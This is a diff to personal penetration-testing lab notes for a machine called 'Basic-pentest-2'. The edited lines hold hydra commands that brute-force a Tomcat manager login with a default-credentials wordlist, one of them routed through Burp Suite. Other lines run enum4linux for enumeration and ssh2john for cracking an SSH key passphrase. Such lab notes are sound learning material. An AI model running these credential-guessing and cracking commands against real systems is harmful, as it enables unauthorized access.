@@ -75,9 +75,10 @@ grep -rli 'technawi' --exclude-dir=/proc . 2>/dev/null
 #### Basic-pentest-2
 what I had learn from this machine is:
 ```
-hydra -C /usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.0.4.22 http-get /manager/html -V : brute force tomcat authentofocation.
+hydra -C /usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.0.4.22 
+http-get /manager/html -V : brute force tomcat authentofocation.
 hydra -C /usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.0.4.22:8080/manager/html -V : meme chose que la premiere
-HYDRA_PROXY_HTTP=http://127.0.0.1:8080 -C /usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.0.4.22:8080/manager/html -t 1 -V :  send the request to burp suite
+HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.0.4.22:8080/manager/html -t 1 -V :  send the request to burp suite
 
 enum4linx 10.0.4.22: list all shared files and groups and user systems
 ssh2john id_rsa file.txt :  to retrive the passphrase
